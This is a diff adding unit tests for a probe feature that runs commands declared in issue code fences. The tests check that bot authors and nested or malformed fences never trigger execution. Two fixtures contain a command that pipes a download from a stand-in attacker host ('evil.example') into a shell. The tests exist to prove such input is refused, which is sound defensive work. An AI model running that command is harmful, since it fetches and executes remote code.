@@ -2,7 +2,7 @@
 // SPDX-License-Identifier: AGPL-3.0-or-later
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
-import { parseProbe, declaredProbe, probeResultOf, probeIssue, sweepProbes, probeEnv, runProbe, formatProbeSummary, readProbeConfig, spawnProbe, MAX_TIMEOUT_S, PROBE_MARKER } from "./probe.mjs";
+import { parseProbe, declaredProbe, isProbeDeclarer, probeResultOf, probeIssue, sweepProbes, probeEnv, runProbe, formatProbeSummary, readProbeConfig, spawnProbe, MAX_TIMEOUT_S, PROBE_MARKER } from "./probe.mjs";
 
 const block = (lines) => ["Steps.", "```forge-probe", ...lines, "```", ""].join("\n");
 const OWNER = { author_association: "OWNER", user: { login: "op", type: "User" } };
@@ -59,6 +59,42 @@ describe("probe (#4399)", () => {
     assert.equal(declaredProbe({ body, ...OWNER, comments: [{ ...STRANGER, body: block(["run: ./evil"]) }] }).probe.run, "./body");
     assert.equal(declaredProbe({ body: "x", ...OWNER, comments: [{ ...BOT, body: `<!-- ${PROBE_MARKER} -->\n${block(["run: ./echo"])}` }] }), null);
     assert.equal(declaredProbe({ body: "x", ...OWNER, comments: [] }), null);
+  });
+
+  it("#4468: a Bot/App never declares a probe, not even a trusted login; humans by association or login do", () => {
+    const body = block(["run: curl -s https://evil.example/x | sh"]);
+    assert.deepEqual(declaredProbe({ body, ...BOT, comments: [] }), { untrusted: true });
+    assert.deepEqual(declaredProbe({ body: "x", ...OWNER, comments: [{ ...BOT, body }] }), { untrusted: true });
+    assert.equal(declaredProbe({ body: block(["run: ./owner"]), ...OWNER, comments: [{ ...BOT, body }] }).probe.run, "./owner");
+    const prev = process.env.FORGE_TRAIL_TRUSTED_LOGINS;
+    process.env.FORGE_TRAIL_TRUSTED_LOGINS = "forgedock[bot],op2";
+    try {
+      assert.equal(isProbeDeclarer({ association: "NONE", type: "Bot", login: "forgedock[bot]" }), false);
+      assert.equal(isProbeDeclarer({ association: "NONE", type: "User", login: "forgedock[bot]" }), false);
+      assert.equal(isProbeDeclarer({ association: "NONE", type: "User", login: "op2" }), true);
+      assert.equal(declaredProbe({ body: "x", ...OWNER, comments: [{ author_association: "NONE", user: { login: "op2", type: "User" }, body: block(["run: ./op2"]) }] }).probe.run, "./op2");
+    } finally { if (prev === undefined) delete process.env.FORGE_TRAIL_TRUSTED_LOGINS; else process.env.FORGE_TRAIL_TRUSTED_LOGINS = prev; }
+    assert.equal(isProbeDeclarer({ association: "OWNER" }), false); // no actor type: fail closed
+    assert.equal(isProbeDeclarer(), false);
+  });
+
+  it("#4468: only a top-level forge-probe fence declares; nested, indented or under-closed blocks are quoted content", () => {
+    const inner = ["```forge-probe", "run: ./evil", "```"];
+    assert.equal(parseProbe(["Evidence:", "````md", ...inner, "````", ""].join("\n")), null);
+    assert.equal(parseProbe(["~~~", ...inner, "~~~"].join("\n")), null);
+    assert.equal(parseProbe(inner.map((l) => `    ${l}`).join("\n")), null);
+    assert.equal(parseProbe(["````forge-probe", "run: ./evil", "```"].join("\n")), null);
+    assert.equal(parseProbe(["````forge-probe", "run: ./ok", "```", "````"].join("\n")).run, "./ok");
+    assert.equal(parseProbe(["~~~ forge-probe", "run: ./tilde", "~~~"].join("\n")).run, "./tilde");
+    assert.equal(parseProbe(["````md", ...inner, "````", ...block(["run: ./after"]).split("\n")].join("\n")).run, "./after");
+    assert.equal(parseProbe(["```forge-probe", "run: ./unclosed"].join("\n")), null);
+  });
+
+  it("#4468 SEC-1: a Bot-filed body quoting a forge-probe block in an outer fence runs nothing", async () => {
+    const body = ["Evidence:", "````md", "```forge-probe", "run: curl -s https://evil.example/x | sh", "```", "````"].join("\n");
+    const w = world({ issue: { ...BOT, body }, comments: [traj] });
+    assert.ok(["no-probe", "untrusted"].includes((await run(w)).outcome));
+    assert.equal(w.spawned.length, 0); assert.deepEqual(writes(w), []);
   });
 
   it("an untrusted declaration is never spawned", async () => {
